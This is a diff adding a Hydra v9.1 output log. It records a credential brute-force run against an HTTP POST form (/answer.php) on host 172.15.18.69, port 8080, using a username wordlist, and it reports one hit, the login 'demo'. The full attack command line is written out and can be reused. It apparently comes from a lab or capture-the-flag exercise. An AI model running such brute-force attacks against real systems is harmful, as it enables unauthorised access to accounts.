@@ -1,0 +1,3 @@
+
+# Hydra v9.1 run at 2020-12-05 08:38:32 on 172.15.18.69 http-post-form (hydra -s 8080 -L multiplesources-users-fabian-fingerle.de.txt -e n -o user_output.txt 172.15.18.69 http-post-form /answer.php:answer=^USER^:F=Sorry, that was not the right answer)
+[8080][http-post-form] host: 172.15.18.69   login: demo
